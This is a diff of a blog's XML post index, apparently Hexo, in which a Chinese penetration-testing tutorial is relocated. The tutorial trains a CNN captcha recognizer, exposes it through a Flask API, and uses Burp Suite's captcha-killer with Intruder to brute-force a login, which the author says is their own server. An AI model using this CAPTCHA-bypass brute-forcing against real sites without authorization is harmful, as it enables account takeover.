@@ -806,6 +806,161 @@ nginx默认日志位置：/var/log/nginx/access.log<br>
       </tags>
   </entry>
   <entry>
+    <title>卷积神经网络结合burpsuite实现渗透测试中的验证码爆破</title>
+    <url>/posts/37998/</url>
+    <content><![CDATA[<h1>前言</h1>
+<p>首先，在这里要感谢c0ny1师傅开发的captcha-killer插件和Nick li大佬的开源项目，还有miniboom师傅提供的思路<br>
+在平时我们进行渗透测试的时候，常常会遇到下面这种情况<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/D%7B5Y%29EA%7DE%25W0XE%5B1OL7MRVP.png" alt=""><br>
+在网站的验证码无法绕过的情况下，我们又需要进行网站的爆破，但爆破得填写正确的验证码进行一个认证，这种情况下可能会劝退部分小伙伴们，这个时候如何处理这种问题成为了一个值得探讨的点。<br>
+看过其他师傅的思路，在这里有一个有效的办法，就是采用深度学习的卷积神经网络对验证码进行训练识别，然后建立模型，调用burpsuite的插件captcha-killer获取识别接口进行爆破。</p>
+<h1>安装</h1>
+<h2 id="cnn-captcha的安装和使用"><a class="header-anchor" href="#cnn-captcha的安装和使用">¶</a>cnn_captcha的安装和使用</h2>
+<h3 id="项目安装及环境准备"><a class="header-anchor" href="#项目安装及环境准备">¶</a>项目安装及环境准备</h3>
+<p>项目为了方便已经转到我的github的仓库上，大家可以去我的仓库进行下载</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">项目地址：https:&#x2F;&#x2F;github.com&#x2F;dota-st&#x2F;cnn_captcha</span><br></pre></td></tr></table></figure>
+<p>项目介绍：<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/%24QG3%40MNR4O%7DTVAZ%28Y748AU8.png" alt=""></p>
+<p>项目使用python语言编写，所以需要搭建python环境，推荐下载python36版本。git clone 项目下来之后，对requirements.txt文件中的第三方库版本进行一个修改。tensorflow的版本改为1.15.3。如果你也想和我一样使用显卡来跑程序，就改成tensorflow-gpu==1.15.3。<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/0%40PNXSO4JL21W%7D~XU508D53.png" alt=""></p>
+<blockquote>
+<p>注意：pip最好进行换源，不然下载这些库的速度可能让你怀疑人生~这里推荐换源成豆瓣源</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip换源方法：</span><br><span class="line"></span><br><span class="line">找到python的安装路径下的site-packages\pip\_internal\models\index.py文件</span><br><span class="line">PyPI &#x3D; Index(&#39;https:&#x2F;&#x2F;pypi.python.org&#x2F;&#39;)</span><br><span class="line">修改成https:&#x2F;&#x2F;pypi.python.org&#x2F; 为 https:&#x2F;&#x2F;pypi.douban.com&#x2F;simple</span><br></pre></td></tr></table></figure>
+<p>换源之后，敲pip install -r requirements.txt命令进行下载文本里的第三方库</p>
+<h3 id="项目使用"><a class="header-anchor" href="#项目使用">¶</a>项目使用</h3>
+<p>确认安装好python的第三方库之后，就可以开始模型的训练了~<br>
+一开始，在没有图片验证码的数据集的情况下，我们可以借助gen_sample_by_captcha.py文件生成验证码的数据集</p>
+<p>首先，我们需要去配置文件进行一个修改（当然不修改也可以）打开conf/captcha_config.json文件，修改成像我这样<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/_4_CH%7BQQ4867P%25%7D80DQ2%28TE.png" alt=""><br>
+一开始我们就先训练纯数字的验证码模型，设置的过于复杂，模型的训练时间也会越长，想要有良好的识别率，就不得不进行多次训练。<br>
+运行gen_sample_by_captcha.py文件，生成10000张图片文件<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/R2%29%24R8A08%40%608%40%5B%25ZQL3N%25%25K.png" alt=""><br>
+在sample/origin目录下可以看见生成的图片<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/H%40PA%40K7FZO3%5D%40%25R%60Q1BIX3D.png" alt=""><br>
+然后sample/origin目录下新建两个文件夹，train和test（不用创建也行，代码里会自动判断有无，进行创建）<br>
+接下来需要使用verify_and_split_data.py文件，我们先看一下他的配置文件/conf/sample_config.json</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;origin_image_dir&quot;: &quot;sample&#x2F;origin&#x2F;&quot;,  # 原始文件</span><br><span class="line">  &quot;new_image_dir&quot;: &quot;sample&#x2F;new_train&#x2F;&quot;,  # 新的训练样本</span><br><span class="line">  &quot;train_image_dir&quot;: &quot;sample&#x2F;train&#x2F;&quot;,    # 训练集</span><br><span class="line">  &quot;test_image_dir&quot;: &quot;sample&#x2F;test&#x2F;&quot;,      # 测试集</span><br><span class="line">  &quot;api_image_dir&quot;: &quot;sample&#x2F;api&#x2F;&quot;,        # api接收的图片储存路径</span><br><span class="line">  &quot;online_image_dir&quot;: &quot;sample&#x2F;online&#x2F;&quot;,  # 从验证码url获取的图片的储存路径</span><br><span class="line">  &quot;local_image_dir&quot;: &quot;sample&#x2F;local&#x2F;&quot;,    # 本地保存图片的路径</span><br><span class="line">  &quot;model_save_dir&quot;: &quot;model&#x2F;&quot;,            # 从验证码url获取的图片的储存路径</span><br><span class="line">  &quot;image_width&quot;: 100,                    # 图片宽度</span><br><span class="line">  &quot;image_height&quot;: 60,                    # 图片高度</span><br><span class="line">  &quot;max_captcha&quot;: 4,                      # 验证码字符个数</span><br><span class="line">  &quot;image_suffix&quot;: &quot;png&quot;,                 # 图片文件后缀</span><br><span class="line">  &quot;char_set&quot;: &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;,  # 验证码识别结果类别</span><br><span class="line">  &quot;use_labels_json_file&quot;: false,                       # 是否开启读取&#96;labels.json&#96;内容</span><br><span class="line">  &quot;remote_url&quot;: &quot;http:&#x2F;&#x2F;127.0.0.1:6100&#x2F;captcha&#x2F;&quot;,      # 验证码远程获取地址</span><br><span class="line">  &quot;cycle_stop&quot;: 3000,                                  # 启动任务后的训练指定次数后停止</span><br><span class="line">  &quot;acc_stop&quot;: 0.99,                                    # 训练到指定准确率后停止</span><br><span class="line">  &quot;cycle_save&quot;: 500,                                   # 训练指定次数后定时保存模型</span><br><span class="line">  &quot;enable_gpu&quot;: 0,                                     # 是否开启GUP训练</span><br><span class="line">  &quot;train_batch_size&quot;: 128,                             # 训练时每次使用的图片张数，如果CPU或者GPU内存太小可以减少这个参数</span><br><span class="line">  &quot;test_batch_size&quot;: 100                               # 每批次测试时验证的图片张数，不要超过验证码集的总数</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们进行一个简单修改，打码部分是我自定义的地址，暂时可以保持原路径不变<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/HXWUB_WGG2%7DFJPI37AZCS%5BA.png" alt=""><br>
+然后运行verify_and_split_data.py文件，程序会同时校验和分割origin和new_train两个目录中的图片,按照比例分到test和train文件夹中；<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/~R77DWZRZXH4GH%252W%5BATK9O.png" alt=""><br>
+后续有了更多的样本，可以把样本放在new_train目录中再次执行verify_and_split_data。<br>
+程序会把无效的文件留在原文件夹。<br>
+此外，当你有新的样本需要一起训练，可以放在sample/new目录下，再次运行verify_and_split_data.py即可。<br>
+需要注意的是，如果新的样本中有新增的标签，你需要把新的标签增加到char_set配置中或者labels.json文件中</p>
+<p>训练集和测试集都有了之后，接下来就是训练模型，运行train_model.py文件进行模型训练<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/%409HLQA8%28J%7D%7B_1E1%7DVJEI%60%7BR.png" alt=""><br>
+训练模型的速度取决取决于你的电脑，可能几十分钟，可能几个小时或者几十个小时不等，可以重复多次运行文件进行训练提高准确率<br>
+这里贴张下面讲实战中使用的模型的训练图片，使用了2000张验证码图片，我的电脑跑了一分钟左右的时间吧<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/%28LUUW%28M9X%7DFU9G%7DGJL5TQPR.png" alt=""><br>
+接下来我们运行test_batch.py文件进行一个验证<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/%5D4KSDH%60KUWFJO%7DKUY61P~ZY.png" alt=""><br>
+接着启动接口的api，运行webserver_recognize_api.py，此时占一个会话窗口<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/WHR9A%25W0%5BL878MEGG~%7DB%40%605.png" alt=""><br>
+再次运行，默认是6000端口，这里我改成了7000端口<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/GE~ZGQURWU%282PL%7D%7BE7H1%28W0.png" alt=""><br>
+启动recognize_local.py文件发送请求进行一个验证<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/Z7%7B_4%29F8%60F%5D4%60DUT%7DP4TV_I.png" alt=""><br>
+接口返回数据就ok啦~</p>
+<h2 id="captcha-killer的安装"><a class="header-anchor" href="#captcha-killer的安装">¶</a>captcha-killer的安装</h2>
+<p>项目地址:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;captcha-killer&#x2F;releases</span><br></pre></td></tr></table></figure>
+<p>下载好jar包之后，打开burpsuite进行安装<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/BGR%24~525EAJZ%7D%257%60QJ%7BBFLP.png" alt=""></p>
+<h1>实战</h1>
+<p>首先使用python爬虫对网站的验证码进行一个爬取<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/1IOO51MC64~YFHOLE%7D_%5B%24LN.png" alt=""><br>
+然后按照上面的步骤进行一个模型训练<br>
+这是我本人服务器上搭建的网站<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/D%7B5Y%29EA%7DE%25W0XE%5B1OL7MRVP.png" alt=""><br>
+首先，我们需要抓取生成验证码文件的包，然后右键发送到captcha面板上<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20201117154445.png" alt=""><br>
+然后在killer面板上，点击一下获取，就可以出现验证码图片和信息了<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/2~EOM%5B%25%5BN%7BFNI%40L%28ZM~2DZU.png" alt=""><br>
+然后我们需要在webserver_recognize_api.py文件新增加一个方法</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/base64&#x27;, methods=[&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">up_imageBase64</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> request.form[<span class="string">&#x27;image_file&#x27;</span>]:</span><br><span class="line"></span><br><span class="line">        timec = str(time.time()).replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        file = request.form[<span class="string">&#x27;image_file&#x27;</span>]</span><br><span class="line">        img = base64.b64decode(file)</span><br><span class="line">        img = BytesIO(img)</span><br><span class="line">        img = Image.open(img, mode=<span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="comment"># username = request.form.get(&quot;name&quot;)</span></span><br><span class="line">        print(<span class="string">&quot;接收图片尺寸: &#123;&#125;&quot;</span>.format(img.size))</span><br><span class="line">        img_size = img.resize((image_width, image_height), Image.ANTIALIAS)</span><br><span class="line">        print(<span class="string">&quot;接收图片尺寸2：&#123;&#125;&quot;</span>.format(img_size))</span><br><span class="line">        s = time.time()</span><br><span class="line">        value = R.rec_image(img_size)</span><br><span class="line">        e = time.time()</span><br><span class="line">        print(<span class="string">&quot;识别结果: &#123;&#125;&quot;</span>.format(value))</span><br><span class="line">        <span class="comment"># 保存图片</span></span><br><span class="line">        print(<span class="string">&quot;保存图片： &#123;&#125;&#123;&#125;_&#123;&#125;.&#123;&#125;&quot;</span>.format(api_image_dir, value, timec, image_suffix))</span><br><span class="line">        file_name = <span class="string">&quot;&#123;&#125;_&#123;&#125;.&#123;&#125;&quot;</span>.format(value, timec, image_suffix)</span><br><span class="line">        file_path = os.path.join(api_image_dir + file_name)</span><br><span class="line">        img.save(file_path)</span><br><span class="line">        result = &#123;</span><br><span class="line">            <span class="string">&#x27;time&#x27;</span>: timec,   <span class="comment"># 时间戳</span></span><br><span class="line">            <span class="string">&#x27;value&#x27;</span>: value,  <span class="comment"># 预测的结果</span></span><br><span class="line">            <span class="string">&#x27;speed_time(ms)&#x27;</span>: int((e - s) * <span class="number">1000</span>)  <span class="comment"># 识别耗费的时间</span></span><br><span class="line">        &#125;</span><br><span class="line">        img.close()</span><br><span class="line">        <span class="keyword">return</span> jsonify(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        content = json.dumps(&#123;<span class="string">&quot;error_code&quot;</span>: <span class="string">&quot;1001&quot;</span>&#125;)</span><br><span class="line">        resp = response_headers(content)</span><br><span class="line">        <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure>
+<p>因为原本的方法up_image()是发送本地图片文件的形式，而我们在captcha_killer需要通过发送表单请求来进行接收<br>
+接着再发送一个requests请求，进行抓包后发送到interface面板上<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20201117154703.png" alt=""><br>
+然后我们把图片内容的位置用标签来代替。<br>
+比如该例子使用的接口是post提交image参数，参数的值为图片二进制数据的base64编码后的url编码。那么Requst template(请求模版)面板应该填写如下：<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/WI%40%604SZ%29%5D4CUK%256MCFK042G.png" alt=""><br>
+接口模板设置：</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>标签</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>&lt;@IMG_RAW&gt;&lt;/@IMG_RAW&gt;</td>
+<td>代表验证码图片原二进制内容</td>
+</tr>
+<tr>
+<td>2</td>
+<td>&lt;@URLENCODE&gt;<a href="mailto:/@URLENCODE">/@URLENCODE</a></td>
+<td>对标签内的内容进行url编码</td>
+</tr>
+<tr>
+<td>3</td>
+<td>&lt;@BASE64&gt;<a href="mailto:/@BASE64">/@BASE64</a></td>
+<td>对标签内的内容进行base64编码</td>
+</tr>
+</tbody>
+</table>
+<p>然后点击识别，即可获取到接口返回的数据包<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/E%7BZN79%25Z56%7B5W5%7D%7B%28CQAG~I.png" alt=""><br>
+这里的匹配方式规则：</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>规则类型</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Repose  data</td>
+<td>这种规则用于匹配接口返回包内容直接是识别结果</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Regular  expression</td>
+<td>正则表达式,适合比较复杂的匹配。比如接口返回包{“coede”:1,“result”:“abcd”}说明abcd是识别结果，我们可以编写规则为result&quot;:“(.*?)”}</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Define  the start and end positions</td>
+<td>定义开始和结束位置,使用上面的例子，可以编写规则{“start”:21,“end”:25}</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Defines  the start and end strings</td>
+<td>定义开始和结束字符，使用上面的例子，可以编写规则为{“start”:“result”:“,“end”:”“}”}</td>
+</tr>
+</tbody>
+</table>
+<p>确认识别无误之后，点击锁定，避免一会进行爆破时出错</p>
+<p>接下来我们去抓取登录界面发送的包，然后发送到intruder面板，然后设置参数<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/AHZMTVCB%60RAA%28X4X3MKI%28GI.png" alt=""><br>
+验证码的pyload选择我们的插件进行生成<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/VI%256A%7BKPX3DTJSZU5T%25Y0P3.png" alt=""><br>
+成功拿到密码<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/%5BS2N%29%5BR%7BF%7D4OJHTGJ0QDB%7B3.png" alt=""></p>
+<p><strong>注：本博客仅供技术研究，若将其信息做其他用途，由用户承担全部法律及连带责任，本博客不承担任何法律及连带责任，请遵守中华人民共和国安全法</strong></p>
+]]></content>
+      <tags>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>攻防世界Web区~持续更新中！</title>
     <url>/posts/14571/</url>
     <content><![CDATA[<h1>新手练习区</h1>
@@ -1026,161 +1181,6 @@ nginx默认日志位置：/var/log/nginx/access.log<br>
 ]]></content>
       <tags>
         <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>卷积神经网络结合burpsuite实现渗透测试中的验证码爆破</title>
-    <url>/posts/37998/</url>
-    <content><![CDATA[<h1>前言</h1>
-<p>首先，在这里要感谢c0ny1师傅开发的captcha-killer插件和Nick li大佬的开源项目，还有miniboom师傅提供的思路<br>
-在平时我们进行渗透测试的时候，常常会遇到下面这种情况<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/D%7B5Y%29EA%7DE%25W0XE%5B1OL7MRVP.png" alt=""><br>
-在网站的验证码无法绕过的情况下，我们又需要进行网站的爆破，但爆破得填写正确的验证码进行一个认证，这种情况下可能会劝退部分小伙伴们，这个时候如何处理这种问题成为了一个值得探讨的点。<br>
-看过其他师傅的思路，在这里有一个有效的办法，就是采用深度学习的卷积神经网络对验证码进行训练识别，然后建立模型，调用burpsuite的插件captcha-killer获取识别接口进行爆破。</p>
-<h1>安装</h1>
-<h2 id="cnn-captcha的安装和使用"><a class="header-anchor" href="#cnn-captcha的安装和使用">¶</a>cnn_captcha的安装和使用</h2>
-<h3 id="项目安装及环境准备"><a class="header-anchor" href="#项目安装及环境准备">¶</a>项目安装及环境准备</h3>
-<p>项目为了方便已经转到我的github的仓库上，大家可以去我的仓库进行下载</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">项目地址：https:&#x2F;&#x2F;github.com&#x2F;dota-st&#x2F;cnn_captcha</span><br></pre></td></tr></table></figure>
-<p>项目介绍：<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/%24QG3%40MNR4O%7DTVAZ%28Y748AU8.png" alt=""></p>
-<p>项目使用python语言编写，所以需要搭建python环境，推荐下载python36版本。git clone 项目下来之后，对requirements.txt文件中的第三方库版本进行一个修改。tensorflow的版本改为1.15.3。如果你也想和我一样使用显卡来跑程序，就改成tensorflow-gpu==1.15.3。<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/0%40PNXSO4JL21W%7D~XU508D53.png" alt=""></p>
-<blockquote>
-<p>注意：pip最好进行换源，不然下载这些库的速度可能让你怀疑人生~这里推荐换源成豆瓣源</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip换源方法：</span><br><span class="line"></span><br><span class="line">找到python的安装路径下的site-packages\pip\_internal\models\index.py文件</span><br><span class="line">PyPI &#x3D; Index(&#39;https:&#x2F;&#x2F;pypi.python.org&#x2F;&#39;)</span><br><span class="line">修改成https:&#x2F;&#x2F;pypi.python.org&#x2F; 为 https:&#x2F;&#x2F;pypi.douban.com&#x2F;simple</span><br></pre></td></tr></table></figure>
-<p>换源之后，敲pip install -r requirements.txt命令进行下载文本里的第三方库</p>
